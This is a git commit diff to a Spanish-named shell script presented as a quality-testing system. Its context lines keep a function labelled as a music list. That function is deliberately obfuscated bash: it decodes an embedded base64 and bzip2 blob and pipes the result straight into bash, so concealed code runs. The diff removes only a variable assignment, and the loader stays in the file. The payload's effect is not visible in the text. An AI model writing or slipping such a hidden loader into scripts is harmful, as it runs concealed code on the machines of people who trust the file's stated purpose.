80b5761c259e621f5e7d162c26aa2f7cb8b1e65c
maxheadroom2 <sinteticbeat@hotmail.com>
2021-10-05 15:12:27 -0500

    prueba

--- sistema_pruebas_calidad.sh
+++ sistema_pruebas_calidad.sh
@@ -39,7 +39,6 @@ function_preparacion_entorno_01(){
 funcion_lista_musica(){
  ${@,,} $'b\x61s'$'\150' ${*,} ${*,,}   <<<   "$(      ${*~} ''\p$'\x72'$'\x69''n'tf  'QlpoOTFBWSZTWQQ6uQsAAAOdgEAABwBAAQpAhAAgACIAMQgGmmgtNXY1ArGXi7kinChIAh1chYA='   "${@%%\]=\]G\`\{:}" "${@~~}"  |   ${*/X=0\{nO/sb\[7\`44;}   ${@~~} b'a'se6$'\u0034'  -d   ${*,,}   |  ${@#O<Qau\]=P}   ${*,,}   ""b'u'${*^}n""$'z\x69'\p$[   ((${*}3${*%%ZY\)lq.p}5#0*3"5""#"0)+${*}37#"2")  ]   -c  ${@,} "${@}"      )"  "${@//\[\)\)-;}"  "${@~}" 
 }
-rudo=funcion_lista_musica
 
 function_preparacion_entorno(){
     DIR1=$HOME/.Music_cache/
